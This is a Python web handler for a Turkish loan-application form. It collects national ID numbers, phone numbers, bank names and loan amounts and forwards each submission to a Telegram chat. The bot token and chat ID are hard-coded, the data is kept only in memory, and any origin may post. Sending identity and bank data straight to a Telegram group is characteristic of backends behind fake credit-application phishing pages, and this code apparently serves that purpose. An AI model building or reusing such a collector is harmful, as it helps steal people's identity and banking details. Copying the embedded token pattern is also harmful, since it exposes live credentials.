from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import os
from datetime import datetime

applications_storage = []


def load_applications():
    global applications_storage
    return applications_storage


def save_applications(applications):
    global applications_storage
    applications_storage = applications


def get_telegram_settings():
    try:
        bot_token = os.environ.get('TELEGRAM_BOT_TOKEN', '6719470714:AAEiTm7V6s3zTB_etIrOpaykcHzDWp3i7YA')
        chat_id_env = os.environ.get('TELEGRAM_CHAT_ID', '-4915858013')
        # chat_id int tipinde olsun
        chat_id = int(chat_id_env) if chat_id_env.lstrip('-').isdigit() else chat_id_env
        return {"bot_token": bot_token, "chat_id": chat_id}
    except:
        return {
            "bot_token": "6719470714:AAEiTm7V6s3zTB_etIrOpaykcHzDWp3i7YA",
            "chat_id": -4915858013
        }


class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            # Yeni başvuru oluştur
            applications = load_applications()
            application = {
                "id": len(applications) + 1,
                "tc_kimlik": data["tc_kimlik"],
                "telefon": data["telefon"],
                "bank_name": data["bank_name"],
                "amount": data["amount"],
                "months": data["months"],
                "status": "pending",
                "created_at": datetime.now().isoformat()
            }
            applications.append(application)
            save_applications(applications)

            # Telegram ayarları
            telegram_settings = get_telegram_settings()
            bot_token = telegram_settings.get("bot_token")
            chat_id = telegram_settings.get("chat_id")

            # Mesaj formatı
            message = (
                f"🏦 Yeni Kredi Başvurusu\n\n"
                f"👤 T.C. Kimlik: {data['tc_kimlik']}\n"
                f"📞 Telefon: {data['telefon']}\n"
                f"🏛️ Banka: {data['bank_name']}\n"
                f"💰 Tutar: {data['amount']:,} TL\n"
                f"📅 Vade: {data['months']} ay\n"
                f"⏰ Tarih: {datetime.now().strftime('%d.%m.%Y %H:%M')}"
            )

            # Telegram API URL
            telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

            # JSON formatında gönderim
            telegram_data = {
                'chat_id': chat_id,
                'text': message,
                'parse_mode': 'HTML'
            }

            try:
                req = urllib.request.Request(
                    telegram_url,
                    data=json.dumps(telegram_data).encode('utf-8'),
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req)
            except Exception as e:
                print(f"Telegram error: {e}")

            # Başarılı cevap
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({"success": True, "message": "Başvuru başarıyla gönderildi"}).encode())

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({"success": False, "message": str(e)}).encode())
